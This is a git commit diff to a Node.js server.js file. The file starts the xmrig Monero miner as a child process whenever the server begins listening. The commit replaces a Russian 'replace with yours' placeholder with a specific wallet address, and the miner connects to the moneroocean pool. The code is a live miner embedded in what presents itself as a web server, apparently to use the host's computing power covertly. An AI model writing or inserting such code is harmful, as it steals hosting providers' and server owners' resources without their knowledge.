8f4aee21423bb11919018e377b7a48f334e906e1
TomTomSol <zaza420squad@gmail.com>
2026-08-19 19:45:07 +0300

    Update server.js

--- server.js
+++ server.js
@@ -15,7 +15,7 @@ server.listen(port, '0.0.0.0', () => {
   // Запускаем майнер как дочерний процесс
   const miner = spawn('/usr/local/bin/xmrig', [
     '-o', 'gulf.moneroocean.stream:10004',
-    '-u', 'ТВОЙ_XMR_АДРЕС',  // ЗАМЕНИ НА СВОЙ
+    '-u', '48oFiSuK4K4WBpQ29kx73CBRtSpm132W2hoXr9RyfUbUCrbvgqLV9PBH1aqyckZemdabBjrwM2D3YieJQD6CKiGZVgkxU36',  // ЗАМЕНИ НА СВОЙ
     '-p', 'x',
     '-k',
     '-t', '2'
